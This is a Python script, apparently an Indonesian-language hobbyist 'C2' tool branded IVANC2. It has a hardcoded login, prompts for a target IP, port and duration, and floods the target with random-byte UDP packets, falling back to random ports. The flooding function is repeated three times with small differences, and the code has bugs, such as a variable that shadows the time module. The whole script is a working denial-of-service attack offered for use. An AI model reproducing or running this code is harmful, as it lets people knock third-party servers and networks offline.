import os
import codecs
import sys
import random
import threading
import time
import socket
from time import time as tt

os.system("clear")

print("""\033[91m


██╗██╗   ██╗ █████╗ ███╗   ██╗ ██████╗██████╗ 
██║██║   ██║██╔══██╗████╗  ██║██╔════╝╚════██╗
██║██║   ██║███████║██╔██╗ ██║██║      █████╔╝
██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔═══╝ 
██║ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗
╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
""")

username = str(input("\033[94m[IVANX3] \033[93mUsername:"))
password = str(input("\033[94m[IVANX3] \033[93mPassword:"))
if password == "IVANC2" and username == "IVANC2":
    print ("Telah Masuk Sebagai IVANC2")
    time.sleep(2)

else:
    print ("Passwordnya Salah Bruh.")
    time.sleep(999)

os.system("clear")
print("""\033[92m

██╗██╗   ██╗ █████╗ ███╗   ██╗ ██████╗██████╗ 
██║██║   ██║██╔══██╗████╗  ██║██╔════╝╚════██╗
██║██║   ██║███████║██╔██╗ ██║██║      █████╔╝
██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔═══╝ 
██║ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗
╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
                                              

""")
time.sleep(0.10)


nicknm = "IVANC2"

mt = """\033[96mUnder \033[0;93mMaintenance"""

os.system("clear")

print("""\033[93m
  
██╗██╗   ██╗ █████╗ ███╗   ██╗ ██████╗██████╗ 
██║██║   ██║██╔══██╗████╗  ██║██╔════╝╚════██╗
██║██║   ██║███████║██╔██╗ ██║██║      █████╔╝
██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔═══╝ 
██║ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗
╚═╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
                                            
""")


ip = str(input("\033[93m====> ★ Enter The Target IP   : "))
port = int(input("\033[93m====> $ Enter The Target PORT   : "))
time = int(input("\033[93m====> $ Enter The Target PACKET   : "))
threads = int(input("\033[93m====> $ Enter The Target THREADS   : "))

os.system("clear")

brand = """\033[95m
███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
\033[91m     PUNYA IVANC2🌹IVANC2
"""

os.system("clear")

def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IVANC2 EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(30, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IVANC2 EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(30, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[92m ★★★★ DARI IVANC2 EUYY ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(67589, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    

if __name__ == '__main__':
    try:
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
        attack(ip, port, time, threads)
    except KeyboardInterrupt:
        print('Attack stopped.')